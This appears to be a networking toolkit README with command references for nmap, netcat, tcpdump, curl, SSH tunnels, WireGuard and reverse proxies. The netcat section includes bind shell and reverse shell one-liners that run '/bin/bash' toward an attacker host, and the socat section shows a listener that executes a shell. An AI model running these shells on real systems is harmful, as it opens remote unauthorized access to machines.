# Networking — Tools, Setup & Reference

Complete networking toolkit for developers, DevOps engineers, and security researchers.
Updated: April 2026.

---

## Quick Navigation

| Section | Description |
|---|---|
| [Core Tools](#core-networking-tools) | nmap, netcat, wireshark, tcpdump |
| [DNS & HTTP](#dns--http-tools) | dig, curl, httpie, mitmproxy |
| [Tunneling & VPN](#tunneling--vpn) | ngrok, Cloudflare Tunnel, WireGuard, OpenVPN |
| [Monitoring](#network-monitoring) | ntopng, iftop, nethogs, netdata |
| [Proxy & Load Balancing](#proxy--load-balancing) | Nginx, HAProxy, Traefik, Caddy |
| [Cybersecurity](./cybersecurity/README.md) | Hacking, pentesting, CTF tools |

---

## Core Networking Tools

### Install

```bash
# macOS
brew install nmap netcat wireshark tcpdump mtr iperf3 \
             socat telnet lsof iproute2mac

# Ubuntu/Debian
sudo apt install -y nmap netcat-openbsd wireshark tcpdump \
                    mtr iperf3 socat telnet net-tools iproute2 \
                    dnsutils traceroute whois ncat

# Arch
sudo pacman -S nmap gnu-netcat wireshark-qt tcpdump mtr iperf3
```

---

### nmap — Network Scanner

```bash
# Basic scan
nmap 192.168.1.1
nmap 192.168.1.0/24          # entire subnet

# Common scan types
nmap -sS 192.168.1.1         # SYN scan (stealth)
nmap -sU 192.168.1.1         # UDP scan
nmap -sV 192.168.1.1         # service/version detection
nmap -O  192.168.1.1         # OS detection
nmap -A  192.168.1.1         # aggressive (OS + version + scripts + traceroute)

# Port ranges
nmap -p 22,80,443 192.168.1.1
nmap -p 1-1000 192.168.1.1
nmap -p- 192.168.1.1         # all 65535 ports

# Output
nmap -oN output.txt 192.168.1.1    # normal
nmap -oX output.xml 192.168.1.1    # XML
nmap -oG output.gnmap 192.168.1.1  # greppable

# Scripts (NSE)
nmap --script=http-headers 192.168.1.1
nmap --script=vuln 192.168.1.1
nmap --script=default 192.168.1.1

# Fast scan (top 100 ports)
nmap -F 192.168.1.0/24

# Ping sweep (host discovery)
nmap -sn 192.168.1.0/24
```

---

### netcat (nc) — Network Swiss Army Knife

```bash
# Listen on port
nc -lvnp 4444

# Connect to host
nc 192.168.1.1 80

# Send data
echo "GET / HTTP/1.0\r\n\r\n" | nc example.com 80

# File transfer
# Receiver:
nc -lvnp 9999 > received_file.txt
# Sender:
nc 192.168.1.2 9999 < file.txt

# Port scanner
nc -zv 192.168.1.1 20-100
nc -zv -u 192.168.1.1 53      # UDP

# Chat
nc -lvnp 1234                 # server
nc 192.168.1.1 1234           # client

# Bind shell (dangerous — test only)
nc -lvnp 4444 -e /bin/bash    # linux
nc -lvnp 4444 -e cmd.exe      # windows

# Reverse shell (for testing)
nc -lvnp 4444                 # attacker listens
nc 10.0.0.1 4444 -e /bin/bash # victim connects back
```

---

### tcpdump — Packet Capture

```bash
# List interfaces
tcpdump -D

# Capture on interface
sudo tcpdump -i eth0
sudo tcpdump -i any            # all interfaces

# Filter by host/port
sudo tcpdump host 192.168.1.1
sudo tcpdump port 80
sudo tcpdump src 192.168.1.1 and dst port 443
sudo tcpdump 'tcp port 80 or tcp port 443'

# Save to file
sudo tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Verbose + ASCII output
sudo tcpdump -A -i eth0 port 80
sudo tcpdump -X -i eth0 port 80   # hex + ASCII

# Capture N packets
sudo tcpdump -c 100 -i eth0

# Don't resolve hostnames
sudo tcpdump -n -i eth0
```

---

### Wireshark — GUI Packet Analyzer

```bash
# Install
brew install --cask wireshark   # macOS
sudo apt install wireshark      # Linux

# CLI version (tshark)
tshark -i eth0
tshark -i eth0 -f "port 80"
tshark -r capture.pcap
tshark -r capture.pcap -Y "http.request"    # display filter

# Common Wireshark display filters
# http.request                  — all HTTP requests
# dns                           — all DNS traffic
# tcp.stream eq 0               — first TCP stream
# ip.addr == 192.168.1.1        — traffic to/from IP
# tcp.flags.syn == 1            — SYN packets
# ssl || tls                    — TLS traffic
# icmp                          — ping traffic
```

---

### mtr — Traceroute + Ping Combined

```bash
mtr google.com                  # interactive
mtr --report google.com         # one-time report
mtr --report-cycles 10 google.com
mtr -n google.com               # no DNS resolution
mtr --tcp --port 443 google.com # TCP mode
```

---

### iperf3 — Bandwidth Testing

```bash
# Server
iperf3 -s
iperf3 -s -p 5201

# Client
iperf3 -c 192.168.1.1
iperf3 -c 192.168.1.1 -t 30    # 30 second test
iperf3 -c 192.168.1.1 -P 4     # 4 parallel streams
iperf3 -c 192.168.1.1 -u       # UDP
iperf3 -c 192.168.1.1 -R       # reverse (server→client)

# JSON output
iperf3 -c 192.168.1.1 -J
```

---

### ss / netstat — Socket Statistics

```bash
# Show all connections
ss -a
ss -tulnp                       # TCP/UDP listening + process

# netstat equivalents
netstat -tulnp
netstat -an | grep LISTEN
netstat -rn                     # routing table

# ss filters
ss -t state established         # established TCP
ss -t state time-wait           # TIME_WAIT connections
ss dst 192.168.1.1              # connections to specific IP
ss sport = :80                  # source port 80
```

---

### lsof — List Open Files/Ports

```bash
# Ports in use
sudo lsof -i -P -n
sudo lsof -i :8080              # who's using port 8080
sudo lsof -i TCP:80

# By process
sudo lsof -p 1234               # files opened by PID 1234
lsof -c nginx                   # files by process name

# Network connections
sudo lsof -i TCP -s TCP:LISTEN
sudo lsof -i UDP
```

---

## DNS & HTTP Tools

### dig — DNS Lookup

```bash
# Basic lookup
dig example.com
dig example.com A               # IPv4
dig example.com AAAA            # IPv6
dig example.com MX              # Mail records
dig example.com NS              # Nameservers
dig example.com TXT             # TXT records
dig example.com SOA             # Start of Authority
dig example.com CNAME

# Specific DNS server
dig @8.8.8.8 example.com
dig @1.1.1.1 example.com

# Reverse lookup
dig -x 8.8.8.8

# Short output
dig example.com +short

# All records
dig example.com ANY +noall +answer

# Zone transfer (AXFR)
dig axfr @ns1.example.com example.com

# Trace full resolution
dig +trace example.com
```

---

### curl — HTTP Testing

```bash
# Basic request
curl https://example.com
curl -s https://example.com     # silent (no progress)
curl -o output.html https://example.com

# Methods
curl -X GET https://api.example.com/users
curl -X POST https://api.example.com/users \
     -H "Content-Type: application/json" \
     -d '{"name":"Alice"}'
curl -X PUT https://api.example.com/users/1 \
     -H "Authorization: Bearer $TOKEN" \
     -d '{"name":"Bob"}'
curl -X DELETE https://api.example.com/users/1

# Headers
curl -H "Accept: application/json" https://api.example.com
curl -I https://example.com     # head only (response headers)
curl -v https://example.com     # verbose (request + response headers)

# Authentication
curl -u username:password https://api.example.com
curl -H "Authorization: Bearer $TOKEN" https://api.example.com

# Follow redirects
curl -L https://example.com

# Download file
curl -O https://example.com/file.zip
curl -C - -O https://example.com/large.zip  # resume

# Upload file
curl -F "file=@/path/to/file.pdf" https://example.com/upload

# Test SSL/TLS
curl -k https://self-signed.example.com   # skip cert verification
curl --cert client.pem --key client.key https://mtls.example.com

# Timing breakdown
curl -w "@curl-format.txt" -o /dev/null -s https://example.com
# curl-format.txt:
#   time_namelookup:  %{time_namelookup}\n
#   time_connect:     %{time_connect}\n
#   time_starttransfer: %{time_starttransfer}\n
#   time_total:       %{time_total}\n

# Rate limiting test
curl --limit-rate 100k https://example.com/large-file
```

---

### HTTPie — Human-Friendly HTTP

```bash
# Install
brew install httpie
pip install httpie

# GET
http GET https://api.example.com/users
http https://api.example.com/users       # GET is default

# POST JSON (auto content-type)
http POST https://api.example.com/users name=Alice age:=30

# PUT with auth header
http PUT https://api.example.com/users/1 \
     Authorization:"Bearer $TOKEN" \
     name=Bob

# DELETE
http DELETE https://api.example.com/users/1

# Download file
http --download https://example.com/file.zip

# Form data
http --form POST https://example.com/upload file@/path/to/file.pdf

# Session persistence
http --session=./session.json GET https://api.example.com/login email=user@example.com password=secret
http --session=./session.json GET https://api.example.com/profile
```

---

### mitmproxy — Intercept HTTP/HTTPS

```bash
# Install
brew install mitmproxy
pip install mitmproxy

# Start proxy (port 8080)
mitmproxy
mitmweb                         # web UI at http://localhost:8081

# Transparent proxy
mitmproxy --mode transparent

# Configure browser/system to use proxy at 127.0.0.1:8080
# Install mitmproxy CA cert: ~/.mitmproxy/mitmproxy-ca-cert.pem

# Filter traffic
mitmproxy -f "~host example.com"

# Record and replay
mitmrecord -w recording.bin https://api.example.com
mitmrecord --replay recording.bin
```

---

## Tunneling & VPN

### ngrok — Expose Local to Internet

```bash
# Install
brew install ngrok
# or download from ngrok.com

# Authenticate
ngrok config add-authtoken $NGROK_TOKEN

# HTTP tunnel
ngrok http 3000
ngrok http 8080

# Custom domain (paid)
ngrok http --domain=myapp.ngrok.io 3000

# TCP tunnel
ngrok tcp 22                    # expose SSH

# Inspect traffic
# http://127.0.0.1:4040          # web UI

# HTTPS with custom headers
ngrok http 3000 --request-header-add="X-Custom:value"
```

---

### Cloudflare Tunnel (cloudflared)

```bash
# Install
brew install cloudflared

# Login
cloudflared login

# Create tunnel
cloudflared tunnel create my-tunnel

# Run tunnel
cloudflared tunnel --url http://localhost:3000

# Configure (config.yml)
cat > ~/.cloudflared/config.yml << 'EOF'
tunnel: <TUNNEL_ID>
credentials-file: /Users/you/.cloudflared/<TUNNEL_ID>.json

ingress:
  - hostname: myapp.example.com
    service: http://localhost:3000
  - hostname: api.example.com
    service: http://localhost:8000
  - service: http_status:404
EOF

cloudflared tunnel run my-tunnel

# DNS setup
cloudflared tunnel route dns my-tunnel myapp.example.com
```

---

### WireGuard — Modern VPN

```bash
# Install
brew install wireguard-tools     # macOS
sudo apt install wireguard       # Linux

# Generate key pair
wg genkey | tee privatekey | wg pubkey > publickey

# Server config (/etc/wireguard/wg0.conf)
cat > /etc/wireguard/wg0.conf << 'EOF'
[Interface]
PrivateKey = <SERVER_PRIVATE_KEY>
Address = 10.0.0.1/24
ListenPort = 51820
PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE

[Peer]
PublicKey = <CLIENT_PUBLIC_KEY>
AllowedIPs = 10.0.0.2/32
EOF

# Client config
cat > wg0-client.conf << 'EOF'
[Interface]
PrivateKey = <CLIENT_PRIVATE_KEY>
Address = 10.0.0.2/24
DNS = 1.1.1.1

[Peer]
PublicKey = <SERVER_PUBLIC_KEY>
Endpoint = your-server.com:51820
AllowedIPs = 0.0.0.0/0          # route all traffic through VPN
PersistentKeepalive = 25
EOF

# Manage
sudo wg-quick up wg0
sudo wg-quick down wg0
sudo wg show                    # status
sudo systemctl enable wg-quick@wg0  # start on boot
```

---

### SSH Tunneling

```bash
# Local port forwarding (access remote service locally)
# ssh -L [local_port]:[remote_host]:[remote_port] [ssh_server]
ssh -L 5432:db.internal:5432 user@bastion.example.com
# Now: psql -h localhost -p 5432 mydb (connects to remote db)

# Remote port forwarding (expose local service remotely)
# ssh -R [remote_port]:[local_host]:[local_port] [ssh_server]
ssh -R 8080:localhost:3000 user@remote-server.com
# People can access your app via remote-server.com:8080

# Dynamic port forwarding (SOCKS5 proxy)
ssh -D 1080 user@remote-server.com
# Configure browser to use SOCKS5 proxy at 127.0.0.1:1080

# Keep tunnel alive
ssh -L 5432:localhost:5432 -N -f user@remote.com   # background, no shell

# Jump host (bastion)
ssh -J bastion.example.com user@internal-server.com

# ~/.ssh/config
cat >> ~/.ssh/config << 'EOF'
Host bastion
  HostName bastion.example.com
  User ubuntu
  IdentityFile ~/.ssh/id_ed25519

Host internal
  HostName 10.0.0.50
  User ubuntu
  ProxyJump bastion
  LocalForward 5432 localhost:5432
EOF
```

---

### socat — Advanced Socket Relay

```bash
# TCP relay
socat TCP-LISTEN:8080,fork TCP:internal.host:80

# UDP relay
socat UDP-LISTEN:5000,fork UDP:10.0.0.1:5000

# SSL tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80

# Serial to TCP
socat /dev/ttyUSB0,b115200 TCP-LISTEN:9000

# File transfer
socat TCP-LISTEN:9999 FILE:received.tar.gz     # receiver
socat FILE:archive.tar.gz TCP:192.168.1.1:9999 # sender

# Execute on connect
socat TCP-LISTEN:4444,fork EXEC:/bin/bash
```

---

## Network Monitoring

### iftop — Bandwidth per Connection

```bash
brew install iftop              # macOS
sudo apt install iftop          # Linux

sudo iftop -i eth0
sudo iftop -i eth0 -n           # no DNS
sudo iftop -i eth0 -N           # no port name resolution
sudo iftop -i eth0 -f "host 8.8.8.8"   # filter
# Interactive: press p (ports), n (DNS), s/d (source/dest), q (quit)
```

---

### nethogs — Bandwidth per Process

```bash
sudo apt install nethogs
brew install nethogs             # macOS (via Homebrew Cask)

sudo nethogs                    # all interfaces
sudo nethogs eth0               # specific interface
sudo nethogs -v 2               # verbosity level
```

---

### nload — Real-time Bandwidth Graphs

```bash
brew install nload
sudo apt install nload

nload
nload eth0
nload -u M                      # units: MB/s
```

---

### Netdata — Real-time Performance Monitoring

```bash
# Install (one-liner)
bash <(curl -Ss https://my-netdata.io/kickstart.sh)

# Docker
docker run -d --name=netdata \
  --pid=host \
  --network=host \
  -v netdataconfig:/etc/netdata \
  -v netdatalib:/var/lib/netdata \
  -v netdatacache:/var/cache/netdata \
  -v /etc/passwd:/host/etc/passwd:ro \
  -v /etc/group:/host/etc/group:ro \
  -v /proc:/host/proc:ro \
  -v /sys:/host/sys:ro \
  -v /etc/os-release:/host/etc/os-release:ro \
  --restart unless-stopped \
  --cap-add SYS_PTRACE \
  --security-opt apparmor=unconfined \
  netdata/netdata

# Access: http://localhost:19999
```

---

## Proxy & Load Balancing

### Nginx — Web Server & Reverse Proxy

```nginx
# /etc/nginx/sites-available/myapp

# Simple reverse proxy
server {
    listen 80;
    server_name example.com;

    location / {
        proxy_pass http://localhost:3000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

# HTTPS with SSL
server {
    listen 443 ssl http2;
    server_name example.com;

    ssl_certificate     /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         HIGH:!aNULL:!MD5;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}

# Load balancing
upstream myapp {
    least_conn;                 # or: round_robin (default), ip_hash
    server 10.0.0.1:3000 weight=3;
    server 10.0.0.2:3000 weight=1;
    server 10.0.0.3:3000 backup;
}

server {
    listen 80;
    location / {
        proxy_pass http://myapp;
    }
}

# Rate limiting
limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;

server {
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://localhost:8000;
    }
}
```

```bash
# Commands
sudo nginx -t                   # test config
sudo systemctl reload nginx     # reload
sudo systemctl restart nginx

# Certbot (Let's Encrypt)
sudo certbot --nginx -d example.com
sudo certbot renew --dry-run
```

---

### Traefik — Cloud-Native Reverse Proxy

```yaml
# docker-compose.yml with Traefik
services:
  traefik:
    image: traefik:v3.0
    command:
      - "--api.insecure=true"
      - "--providers.docker=true"
      - "--providers.docker.exposedbydefault=false"
      - "--entrypoints.web.address=:80"
      - "--entrypoints.websecure.address=:443"
      - "--certificatesresolvers.letsencrypt.acme.tlschallenge=true"
      - "--certificatesresolvers.letsencrypt.acme.email=you@example.com"
      - "--certificatesresolvers.letsencrypt.acme.storage=/letsencrypt/acme.json"
    ports:
      - "80:80"
      - "443:443"
      - "8080:8080"   # dashboard
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
      - letsencrypt:/letsencrypt

  myapp:
    image: myapp:latest
    labels:
      - "traefik.enable=true"
      - "traefik.http.routers.myapp.rule=Host(`myapp.example.com`)"
      - "traefik.http.routers.myapp.entrypoints=websecure"
      - "traefik.http.routers.myapp.tls.certresolver=letsencrypt"
      - "traefik.http.services.myapp.loadbalancer.server.port=3000"

volumes:
  letsencrypt:
```

---

### Caddy — Automatic HTTPS

```bash
# Install
brew install caddy
sudo apt install caddy

# Caddyfile
cat > Caddyfile << 'EOF'
example.com {
    reverse_proxy localhost:3000
}

api.example.com {
    reverse_proxy localhost:8000
    header /api/* {
        Access-Control-Allow-Origin *
        Access-Control-Allow-Methods "GET, POST, PUT, DELETE"
    }
}

:2015 {
    file_server
    root * /var/www/html
}
EOF

caddy run                       # foreground
caddy start                     # background
caddy reload                    # reload config
caddy validate                  # validate Caddyfile
```

---

### HAProxy — High-Availability Load Balancer

```
# /etc/haproxy/haproxy.cfg

global
    maxconn 50000
    log stdout format raw local0

defaults
    mode http
    timeout connect 5s
    timeout client 50s
    timeout server 50s
    option httplog
    option dontlognull

frontend http_front
    bind *:80
    default_backend http_back
    acl is_api path_beg /api/
    use_backend api_back if is_api

backend http_back
    balance roundrobin
    option httpchk GET /health
    server web1 10.0.0.1:3000 check
    server web2 10.0.0.2:3000 check
    server web3 10.0.0.3:3000 check

backend api_back
    balance leastconn
    server api1 10.0.0.10:8000 check
    server api2 10.0.0.11:8000 check

listen stats
    bind *:8404
    stats enable
    stats uri /stats
    stats refresh 10s
    stats auth admin:secret
```

```bash
haproxy -c -f /etc/haproxy/haproxy.cfg   # validate
sudo systemctl restart haproxy
```

---

## IP & Routing

```bash
# Show interfaces
ip addr show
ifconfig                        # older systems

# Show routing table
ip route show
route -n                        # older

# Add static route
sudo ip route add 192.168.2.0/24 via 192.168.1.1
sudo ip route del 192.168.2.0/24

# ARP table
arp -a
ip neigh show

# Flush DNS cache
sudo dscacheutil -flushcache && sudo killall -HUP mDNSResponder  # macOS
sudo systemd-resolve --flush-caches                               # Linux systemd
sudo resolvectl flush-caches                                      # Ubuntu 22+

# Network namespaces
sudo ip netns add myns
sudo ip netns exec myns bash
sudo ip netns list
sudo ip netns del myns
```

---

## See Also

- [Cybersecurity Tools](./cybersecurity/README.md) — Pentesting, hacking, CTF tools
